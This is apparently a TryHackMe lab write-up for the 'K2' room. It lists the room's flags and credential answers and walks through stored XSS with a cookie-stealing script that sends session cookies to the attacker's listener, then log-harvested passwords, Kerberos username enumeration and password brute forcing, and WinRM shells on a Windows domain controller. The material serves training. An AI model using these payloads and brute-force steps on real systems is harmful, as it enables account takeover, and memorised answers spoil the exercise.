<h1 align="center">K2</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/566c97cf-ebc9-4118-a79a-b9e94a7044a4"><br>
2025, September 29<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>511</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>earn about techniques attackers use to steal account credentials.</em>.<br>
Access it <a href="https://tryhackme.com/room/xdrcredentialaccess"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/e77a69bc-a778-46c3-b24a-9b3518df1565"></p>

<h2 align="center">Task 1 . Base Camp</h2>
<p>You have been asked to run a vulnerability test on the K2 network in order to see if there is any way that a malicious actor would be able to infiltrate.<br>

The IT team assures you that the network is secure and that you won't be able to make your way up the mountain.<br>

They have only provided you with their external website called <code>k2.thm</code>.<br>

Please allow 3-5 minutes for the VM to fully start.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. What is the user flag?<br>
<code>THM{9e04a7419a2b7a86163496271a8a95dd}</code></p>

<br>
<p>1.2. What is the root flag?<br>
<code>THM{c6f684e3b1089cd75f205f93de9fe93d}</code></p>

<br>
<p>1.3.What are the usernames and passwords that had access to the server? List the usernames in alphabetical order with their corresponding password separated by a comma. Format is username:password.<br>
<code>james:Pwd@9tLNrC3!,root:RdzQ7MSKt)fNaz3!,rose:vRMkaVgdfxhW!8</code></p>

<br>
<p>1.4.What are the usernames and passwords that had access to the server? List the usernames in alphabetical order with their corresponding password separated by a comma. Format is username:password.<br>
<code>james:Pwd@9tLNrC3!,root:RdzQ7MSKt)fNaz3!,rose:vRMkaVgdfxhW!8</code></p>

<br>
<h3 align="center">Host Resolution</h3>
<p  align="center"><code>k2.thm</code></p>

```bash
xx.xxx.xx.xxx    k2.thm
```

<br>
<h3 align="center">Port Scanning</h3>

```bash
:~/K2# nmap -sC -sV -Pn -n -p- -T4 k2.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-29 xx:xx BST
Nmap scan report for k2.thm (10.201.88.234)
Host is up (0.0045s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Dimension by HTML5 UP
MAC Address: 16:FF:D3:70:EB:ED (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds
```


<br>
<h3 align="center">Web Inspection</h3>
<p align="center"><code>k2.thm</code><br>static</p>

<img width="1125" height="671" alt="image" src="https://github.com/user-attachments/assets/25085b1d-f18f-427e-8048-987921d055a5" />

<br>
<br>
<br>
<h3 align="center">Host Enumeration</h3>
<p align="center">admin  .  it</p>

```bash
:~/K2# ffuf -u 'http://k2.thm/' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.k2.thm' -fs 13229
...
admin                   [Status: 200, Size: 967, Words: 298, Lines: 24]
it                      [Status: 200, Size: 1083, Words: 322, Lines: 25]
ADMIN                   [Status: 200, Size: 967, Words: 298, Lines: 24]
```

<img width="1287" height="470" alt="image" src="https://github.com/user-attachments/assets/83ffed97-af9f-40e2-909a-48a758b67f59" />

<br>
<br>
<br>
<h3 align="center">Host Resolution</h3>
<p  align="center"><code>admin.k2.thm  .  it.k2.thm</code></p>

```bash
xx.xxx.xx.xxx    admin.k2.thm it.k2.thm
```

<br>
<h3 align="center">Web Inspection</h3>
<p align="center"><code>admin.k2.thm</code></p>

<img width="1129" height="694" alt="image" src="https://github.com/user-attachments/assets/d9e702dc-dd26-4349-b32b-3a1bca0517fe" />

<br>
<br>
<br>
<p align="center"><code>admin.k2.thm</code></p>

<img width="1128" height="714" alt="image" src="https://github.com/user-attachments/assets/6882d529-0146-4b16-b2f0-67c15eecd590" />


<br>
<br>
<br>
<p align="center"><code>admin.k2.thm/register</code></p>

<img width="1131" height="704" alt="image" src="https://github.com/user-attachments/assets/926012e2-c75c-4268-9da7-1ba0e46d1d80" />

<p>

- launched Burp Suite<br>
- enabled FoxyProxy<br>
- Sign Up<br>
- registered <strong>lili</strong><br>
- clicked <strong>Do intercept</strong> > <strong>Response to this request</strong><br>
- <strong>Forward</strong></p>

<img width="1013" height="359" alt="image" src="https://github.com/user-attachments/assets/bf637b7a-2ed9-4403-b8de-ea11003e34b3" />

<br>
<br>
<br>

<img width="1013" height="361" alt="image" src="https://github.com/user-attachments/assets/dfbefa63-7bff-4048-add8-bfb72b3f6c97" />

<br>
<br>
<br>
<p>

- navigated to <strong>it.k2.thm/login</strong><br>
- logged in</p>


<img width="1129" height="701" alt="image" src="https://github.com/user-attachments/assets/6a9fe780-6597-45d1-a092-ae30c3875ee2" />

<br>
<br>
<br>

<p>

- Inspect<br>
- Storage<br>
- Cookies<br><br>

OR<br><br>

- Burp Suite´s Response <strong>Set-Cookie: session =</strong></p>

eyJhdXRoX3VzZXJuYW1lIjoibGlsaSIsImlkIjoxLCJsb2dnZWRpbiI6dHJ1ZX0.aNrnBw.ozF02MCsRjyFFHLRUvvHLCFbG_g

eyJhdXRoX3VzZXJuYW1lIjoibGlsaSIsImlkIjoxLCJsb2dnZWRpbiI6dHJ1ZX0.aNrnBw.ozF02MCsRjyFFHLRUvvHLCFbG_g;


<br>
<br>
<br>
<p align="center"><code>jwt.io</code></p>

```bash
{
  "auth_username": "lili",
  "id": 1,
  "loggedin": true
}
```

<img width="530" height="194" alt="image" src="https://github.com/user-attachments/assets/551a75ea-bb49-48bd-99b1-d85d41ec4955" />

<br>
<br>
<br>
<p align="center">Title: Hello; Description: --> Ticket submitted successfully! It will be reviewed shortly!</p>

<img width="365" height="135" alt="image" src="https://github.com/user-attachments/assets/9dfd1520-0f7e-41db-86ee-96f0191b99c0" />

<br>

<img width="1019" height="359" alt="image" src="https://github.com/user-attachments/assets/6e2f2439-c49b-47c1-9320-cea3b8ae5358" />

<br>

Title : <script src='http://10.201.108.225:8000/title'></script>

Description: <script src='http://10.201.108.225:8000/description'></script>

<p>cookiestealer.js</p>

:~/K2# cat cookiestealer.js
fetch('http://10.201.88.234/cookie='+btoa(document["cookie"]));

__

new Image().src='http://10.201.108.225:8000/hey?cookie=' + document.cookie;


__

bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vMTAuMjAxLjEwOC4yMjU6ODAwMC9oZXk/Y29va2llPScgKyBkb2N1bWVudC5jb29raWU7


__

POST /dashboard HTTP/1.1
Host: it.k2.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 161
Origin: http://it.k2.thm
Connection: close
Referer: http://it.k2.thm/dashboard
Cookie: session=eyJhdXRoX3VzZXJuYW1lIjoibGlsaSIsImlkIjoxLCJsb2dnZWRpbiI6dHJ1ZX0.aNrnBw.ozF02MCsRjyFFHLRUvvHLCFbG_g
Upgrade-Insecure-Requests: 1
Priority: u=0, i

title=hello&description=<script>eval (atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vMTAuMjAxLjEwOC4yMjU6ODAwMC9oZXk/Y29va2llPScgKyBkb2N1bWVudC5jb29raWU7'));</script>


__


:~/K2# echo 'eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.aNr2og.GPdhIzUEKjqX4MTXVnSJenDce_M' | base64 -d
{"admin_username":"james","id":1,"loggedin":true}


:~/K2# echo 'eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.aNr2oA.THp1kRD9dU-Vfs8bg6iBAb_WzPM' | base64 -d
{"admin_username":"james","id":1,"loggedin":true}


___


substituted cookie in inspect

<img width="1115" height="342" alt="image" src="https://github.com/user-attachments/assets/0efd0248-6b77-44ea-b411-ba1f051e1160" />






10.201.88.234 - - [29/Sep/2025 22:13:03] code 404, message File not found
10.201.88.234 - - [29/Sep/2025 22:13:03] "GET /hey?cookie=session=eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.aNr2Xg.q58cPXoCGikHgeXzQNzbLhofyCE HTTP/1.1" 404 -
10.201.88.234 - - [29/Sep/2025 22:13:06] code 404, message File not found
10.201.88.234 - - [29/Sep/2025 22:13:06] "GET /hey?cookie=session=eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.aNr2YQ._na-CB3su4kKMNxZPsa2dk4uU0E HTTP/1.1" 404 -
10.201.88.234 - - [29/Sep/2025 22:13:08] code 404, message File not found
10.201.88.234 - - [29/Sep/2025 22:13:08] "GET /hey?cookie=session=eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.aNr2Yw.jw0i7ohBBqYNuO4t7odAAV8MCyg HTTP/1.1" 404 -
10.201.88.234 - - [29/Sep/2025 22:13:10] code 404, message File not found
10.201.88.234 - - [29/Sep/2025 22:13:10] "GET /hey?cookie=session=eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.aNr2ZQ.S9SR5MFiV69rkEkpCPV4E9JDCgE HTTP/1.1" 404 -
10.201.88.234 - - [29/Sep/2025 22:13:12] code 404, message File not found
10.201.88.234 - - [29/Sep/2025 22:13:12] "GET /hey?cookie=session=eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.aNr2Zw.G1dh-02jwMENurFPN-i3NIgDR6k HTTP/1.1" 404 -















POST /dashboard HTTP/1.1
Host: it.k2.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Origin: http://it.k2.thm
Connection: close
Referer: http://it.k2.thm/dashboard
Cookie: session=eyJhdXRoX3VzZXJuYW1lIjoibGlsaSIsImlkIjoxLCJsb2dnZWRpbiI6dHJ1ZX0.aNrnBw.ozF02MCsRjyFFHLRUvvHLCFbG_g
Upgrade-Insecure-Requests: 1
Priority: u=0, i

title=hello&description=<script src="http://10.201.108.225:8000/cookiestealer.js"></script>




HTTP/1.1 200 OK
                    Ticket submitted successfully! It will be reviewed shortly!                









~/K2# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.88.234 - - [29/Sep/2025 22:07:03] "GET /cookiestealer.js HTTP/1.1" 200 -
10.201.88.234 - - [29/Sep/2025 22:07:05] "GET /cookiestealer.js HTTP/1.1" 200 -
10.201.88.234 - - [29/Sep/2025 22:07:07] "GET /cookiestealer.js HTTP/1.1" 200 -
10.201.88.234 - - [29/Sep/2025 22:07:09] "GET /cookiestealer.js HTTP/1.1" 200 -





<br>
<h3 align="center">Host Resolution</h3>
<p  align="center"><code>k2.thm  .  admin.ke.thm  .  it.k2.thm</code></p>

```bash
xx.xxx.xx.xxx    k2.thm admin.k2.thm it.k2.thm
```








james@k2:/var/log/nginx$ cat access.log.1 | grep pass
10.0.2.51 - - [24/May/2023:22:17:17 +0000] "GET /login?username=rose&password=RdzQ7MSKt)fNaz3! HTTP/1.1" 200 1356 "http://admin.k2.thm/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
james@k2:/var/log/nginx$ 





james@k2:/var/log$ cd nginx
james@k2:/var/log/nginx$ grep -Ri 'pass'
access.log.1:10.0.2.51 - - [24/May/2023:22:17:17 +0000] "GET /login?username=rose&password=RdzQ7MSKt)fNaz3! HTTP/1.1" 200 1356 "http://admin.k2.thm/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
james@k2:/var/log/nginx$ grep -i bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
rose:x:1001:1001:Rose Bud:/home/rose:/bin/bash
james:x:1002:1002:James Bold:/home/james:/bin/bash
james@k2:/var/log/nginx$ grep -i /bin/bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
rose:x:1001:1001:Rose Bud:/home/rose:/bin/bash
james:x:1002:1002:James Bold:/home/james:/bin/bash
james@k2:/var/log/nginx$ 




james@k2:/var/log/nginx$ su root
Password: RdzQ7MSKt)fNaz3!
root@k2:/var/log/nginx# 



james@k2:/var/log/nginx$ su root
Password: 
root@k2:/var/log/nginx# id
uid=0(root) gid=0(root) groups=0(root)
root@k2:/var/log/nginx# cd /root
root@k2:~# ls
root.txt  snap
root@k2:~# cat root.txt
THM{c6f684e3b1089cd75f205f93de9fe93d}
root@k2:~# 



root@k2:~# grep -i /bin/bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
rose:x:1001:1001:Rose Bud:/home/rose:/bin/bash
james:x:1002:1002:James Bold:/home/james:/bin/bash
root@k2:~# 


root@k2:~# cd /home/rose
root@k2:/home/rose# ls -lah
total 40K
drwxr-xr-x 5 rose rose 4.0K Jun 13  2023 .
drwxr-xr-x 4 root root 4.0K Jun 13  2023 ..
-rw-r----- 1 rose rose   30 Mar 12  2024 .bash_history
-rw-r--r-- 1 rose rose  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 rose rose 3.7K Feb 25  2020 .bashrc
drwx------ 3 rose rose 4.0K Jun 13  2023 .cache
drwxrwxr-x 4 rose rose 4.0K Jun 13  2023 k2_site
drwx------ 4 rose rose 4.0K Jun 13  2023 .local
-rw-r--r-- 1 rose rose  807 Feb 25  2020 .profile
-rw-rw-r-- 1 rose rose   75 Jun 13  2023 .selected_editor
-rw------- 1 rose rose    0 Jun 19  2023 .viminfo



root@k2:/home/rose# cat .bash_history
sudo suvRMkaVgdfxhW!8
sudo su







<h2 align="center">Task 2 . Middle Camp</h2>
<p>The IT Team can't believe that you have made it past the first server. However, they feel confident that you won't make it much further.<br>

Use all of the information gathered from your previous findings in order to keep making your way to the top.<br>

Please allow 3-5 minutes for the VM to fully start.</p>

<p><em>Answer the questions below</em></p>


<br>
<br>
<h3 align="center">Host Resolution</h3>
<p  align="center"><code>k2.thm</code></p>

```bash
xx.xxx.xx.xxx    k2.thm
```

<br>
<h3 align="center">Port Scanning</h3>

<div align="center"><h6>

| **Port**      | **Service**|
|--------------:|:-----------|
| `53`          |            |
| `88`          |KBR         |
| `135`         |RPC         |
| `139`         |            |
| `389`         |LDAP        |
| `445`         |            |
| `464`         |            |
| `593`         |            |
| `636`         |            |
| `3268`        |LDAP        |
| `3269`        |            |
| `3389`        |RDP         |
| `5985`        |HTTP-API    |
| `93895`       |            |
| `496695`      |RPC         |
| `496745`      |RPC         |
| `496755`      |RPC         |
| `496785`      |RPC         |
| `496815`      |RPC         |
| `497055`      |RPC         |
| `497925`      |RPC         |

</h6></div><br>


```bash
:~/K2# nmap -sT k2.thm
...
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
```

```bash
:~/K2# nmap -sT -p- k2.thm
...
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49678/tcp open  unknown
49702/tcp open  unknown
49793/tcp open  unknown
```

```bash
:~/K2# nmap -sC -sV -Pn -n -p- -T4 k2.thm
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-29 xx:xx:xxZ)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: K2
|   NetBIOS_Domain_Name: K2
|   NetBIOS_Computer_Name: K2SERVER
|   DNS_Domain_Name: k2.thm
|   DNS_Computer_Name: K2Server.k2.thm
|   DNS_Tree_Name: k2.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-29Txx:xx:xx+00:00
| ssl-cert: Subject: commonName=K2Server.k2.thm
| Not valid before: 2025-09-28Txx:xx:xx
|_Not valid after:  2026-03-30Txx:xx:xx
|_ssl-date: 2025-09-29T19:10:48+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49792/tcp open  msrpc         Microsoft Windows RPC
...
Host script results:
|_nbstat: NetBIOS name: K2SERVER, NetBIOS user: <unknown>, NetBIOS MAC: ... (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-29Txx:xx:xx
|_  start_date: N/A
```

<br>
<h3 align="center">Host Resolution</h3>
<p  align="center"><code>k2.thm</code>  .  <code>k2server.k2.thm</code></p>

```bash
xx.xxx.xx.xxx    k2.thm k2server.k2.thm
```

<br>
<h3 align="center">Custom Username Wordlist</h3>

<p>

- previously we discovered some credentials</p>

```bash
james:************
rose:************
bob:***********
steve:***********
cait:**************
xu:************
ash:****************
```

<p>
  
- cloned <strong>username-anarchy</strong> repository<br>
- execute it to create a custom username wordlist based on <strong>Rose Bud</strong> and <strong>James Bold</strong></p>

```bash
:~/K2# git clone https://github.com/urbanadventurer/username-anarchy
```

```bash
:~/K2/username-anarchy# ls
CHANGELOG.md  debian  format-plugins.rb  LICENSE  names  README.md  test-names2.txt  test-names3.txt  test-names.txt  username-anarchy
```

```bash
:~/K2/username-anarchy# ./username-anarchy Rose Bud >> ../A.txt && ./username-anarchy James Bold >> ../A.txt
```

```bash
:~/K2/username-anarchy# cd ..
```

```bash
:~/K2# head -n 8 A.txt
rose
rosebud
rose.bud
roseb
r.bud
rbud
brose
b.rose
```

<p>

- identified <strong>r.bud</strong>@k2.thm and <strong>j.bold</strong></p>

```bash
:~/K2# kerbrute userenum -d k2.thm --dc k2server.k2.thm A.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/29/25 - Ronnie Flathers @ropnop

2025/09/29 xx:xx:xx >  Using KDC(s):
2025/09/29 xx:xx:xx >  	K2server.k2.thm:88

2025/09/29 xx:xx:xx >  [+] VALID USERNAME:	 r.bud@k2.thm
2025/09/29 xx:xx:xx >  [+] VALID USERNAME:	 j.bold@k2.thm
2025/09/29 xx:xx:xx >  Done! Tested 28 usernames (2 valid) in 0.007 seconds
```

<br>
<br>
<br>

```bash
:~/K2# cat passwords.txt
************
************
***********
***********
**************
************
****************
****************
**************
```

```bash
:~/K2# kerbrute bruteuser -d k2.thm --dc k2server.k2.thm passwords.txt r.bud

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/29/25 - Ronnie Flathers @ropnop

2025/09/29 xx:xx:xx >  Using KDC(s):
2025/09/29 xx:xx:xx >  	K2server.k2.thm:88

2025/09/29 xx:xx:xx >  [+] VALID LOGIN:	 r.bud@k2.thm:**************
2025/09/29 xx:xx:xx >  Done! Tested 9 logins (1 successes) in 0.411 seconds
```

<img width="1286" height="246" alt="image" src="https://github.com/user-attachments/assets/207a703d-e97c-410a-82d7-7db098ed953a" />

<br>
<br>
<br>

```bash
:~/K2# nxc smb K2Server.k2.thm -u r.bud -p '**************' --shares
SMB         xx.xxx.xx.xxx   445    K2SERVER         [*] Windows 10 / Server 2019 Build 17763 x64 (name:K2SERVER) (domain:k2.thm) (signing:True) (SMBv1:False) 
SMB         xx.xxx.xx.xxx   445    K2SERVER         [+] k2.thm\r.bud:************** 
SMB         xx.xxx.xx.xxx   445    K2SERVER         [*] Enumerated shares
SMB         xx.xxx.xx.xxx   445    K2SERVER         Share           Permissions     Remark
SMB         xx.xxx.xx.xxx   445    K2SERVER         -----           -----------     ------
SMB         xx.xxx.xx.xxx   445    K2SERVER         ADMIN$                          Remote Admin
SMB         xx.xxx.xx.xxx   445    K2SERVER         C$                              Default share
SMB         xx.xxx.xx.xxx   445    K2SERVER         IPC$            READ            Remote IPC
SMB         xx.xxx.xx.xxx   445    K2SERVER         NETLOGON        READ            Logon server share 
SMB         xx.xxx.xx.xxx   445    K2SERVER         SYSVOL          READ            Logon server share 
```


```bash
:~/K2# nxc winrm K2Server.k2.thm -u r.bud -p 'vRMkaVgdfxhW!8'
WINRM       xx.xxx.xx.xxx  5985   K2SERVER         [*] Windows 10 / Server 2019 Build 17763 (name:K2SERVER) (domain:k2.thm) 
WINRM       xx.xxx.xx.xxx  5985   K2SERVER         [+] k2.thm\r.bud:vRMkaVgdfxhW!8 (Pwn3d!)
```

```bash
:~/K2# evil-winrm -i K2Server.k2.thm -u r.bud -p '**************'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\r.bud\Documents> dir


    Directory: C:\Users\r.bud\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/29/2024   x:xx PM            327 notes.txt
-a----        1/29/2024   x:xx PM            349 note_to_james.txt


*Evil-WinRM* PS C:\Users\r.bud\Documents> type notes.txt
Done:
1. Note was sent and James has already performed the required action. They have informed me that they kept the base password the same, they just added two more characters to meet the criteria. It is easier for James to remember it that way.

2. James's password meets the criteria.

Pending:
1. Give James Remote Access.
*Evil-WinRM* PS C:\Users\r.bud\Documents> type note_to_james.txt
Hello James:

Your password "rockyou" was found to only contain alphabetical characters. I have removed your Remote Access for now.

At the very least adhere to the new password policy:
1. Length of password must be in between 6-12 characters
2. Must include at least 1 special character
3. Must include at least 1 number between the range of 0-999
*Evil-WinRM* PS C:\Users\r.bud\Documents>
```


<p aling="center"><em>james_variations.py</em></p>

```bash
#!/usr/bin/env python3

import string

base_pass = "rockyou"
special_chars = string.punctuation

f = open("./james.txt", "w")

for i in range(0, 10):
	for special_char in special_chars:
		f.write(f"{base_pass}{special_char}{i}\n")
		f.write(f"{base_pass}{i}{special_char}\n")
		f.write(f"{special_char}{i}{base_pass}\n")
		f.write(f"{i}{special_char}{base_pass}\n")
		f.write(f"{i}{base_pass}{special_char}\n")
		f.write(f"{special_char}{base_pass}{i}\n")

f.close()
```



:~/K2# python3 james_variations.py


:~/K2# tail -n 7 james.txt
}rockyou9
rockyou~9
rockyou9~
~9rockyou
9~rockyou
9rockyou~
~rockyou9





root@ip-10-201-108-225:~/K2# kerbrute bruteuser -d k2.thm --dc K2server.k2.thm james.txt j.bold

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/29/25 - Ronnie Flathers @ropnop

2025/09/29 23:42:50 >  Using KDC(s):
2025/09/29 23:42:50 >  	K2server.k2.thm:88

2025/09/29 23:43:07 >  [+] VALID LOGIN:	 j.bold@k2.thm:#8rockyou
2025/09/29 23:43:07 >  Done! Tested 1572 logins (1 successes) in 17.745 seconds
root@ip-10-201-108-225:~/K2# 




<img width="1284" height="269" alt="image" src="https://github.com/user-attachments/assets/99ea00a1-0ea4-408b-9e0f-9bda4e425bba" />




root@ip-10-201-108-225:~/K2# nxc smb K2Server.k2.thm -u 'j.bold' -p '#8rockyou'
SMB         10.201.43.198   445    K2SERVER         [*] Windows 10 / Server 2019 Build 17763 x64 (name:K2SERVER) (domain:k2.thm) (signing:True) (SMBv1:False) 
SMB         10.201.43.198   445    K2SERVER         [+] k2.thm\j.bold:#8rockyou 





:~/K2# nxc winrm K2Server.k2.thm -u 'j.bold' -p '#8rockyou'
WINRM       10.201.43.198   5985   K2SERVER         [*] Windows 10 / Server 2019 Build 17763 (name:K2SERVER) (domain:k2.thm) 
WINRM       10.201.43.198   5985   K2SERVER         [-] k2.thm\j.bold:#8rockyou


Bloodhound




root@ip-10-201-108-225:~/K2# net rpc password 'j.smith' 'Password123!' -U 'k2.thm'/'j.bold'%'#8rockyou' -S 'k2server.k2.thm'
root@ip-10-201-108-225:~/K2# nxc winrm k2server.k2.thm -u 'j.smith' -p 'Password123!'
WINRM       10.201.43.198   5985   K2SERVER         [*] Windows 10 / Server 2019 Build 17763 (name:K2SERVER) (domain:k2.thm) 
WINRM       10.201.43.198   5985   K2SERVER         [+] k2.thm\j.smith:Password123! (Pwn3d!)




root@ip-10-201-108-225:~/K2# net rpc password 'j.smith' 'Password123!' -U 'k2.thm'/'j.bold'%'#8rockyou' -S 'k2server.k2.thm'
root@ip-10-201-108-225:~/K2# nxc winrm k2server.k2.thm -u 'j.smith' -p 'Password123!'
WINRM       10.201.43.198   5985   K2SERVER         [*] Windows 10 / Server 2019 Build 17763 (name:K2SERVER) (domain:k2.thm) 
WINRM       10.201.43.198   5985   K2SERVER         [+] k2.thm\j.smith:Password123! (Pwn3d!)
root@ip-10-201-108-225:~/K2# evil-winrm -i k2server.k2.thm -u 'j.smith' -p 'Password123!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\j.smith\Documents> whoami
k2\j.smith
*Evil-WinRM* PS C:\Users\j.smith\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users\j.smith\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
